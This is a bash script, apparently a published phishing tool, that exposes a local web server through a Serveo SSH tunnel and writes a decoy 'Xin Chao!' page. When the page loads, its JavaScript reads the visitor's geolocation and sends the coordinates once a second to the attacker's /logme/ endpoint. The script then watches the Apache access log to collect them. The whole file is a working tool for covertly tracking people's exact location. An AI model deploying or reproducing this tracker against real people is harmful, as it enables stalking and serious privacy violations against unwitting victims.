#!/bin/bash

#Serveo to host page using remote port forwarding
xterm -e ssh -R 80:localhost:80 serveo.net & clear


echo "            

██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ 
   
[+] Author: Viral Maniar
[+] Twitter: @ManiarViral
[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.                                                            

"
sleep 5
read -p 'Enter the URL generated by Serveo: ' varurl

echo "<!DOCTYPE html>
<html>
    <head>
        <title>Xin Chao!</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"https://user-images.githubusercontent.com/3501170/55271108-d11b3180-52fb-11e9-97e2-c930be295147.png\");
                background-size: 1650px 1150px;
                background-repeat: no-repeat;
            }
        </style>
    </head>
    <body>
        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }
        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });
        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
service apache2 start

echo "   
██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ 

[+] Author: Viral Maniar
[+] Twitter: @ManiarViral
[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.                                                            
" > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
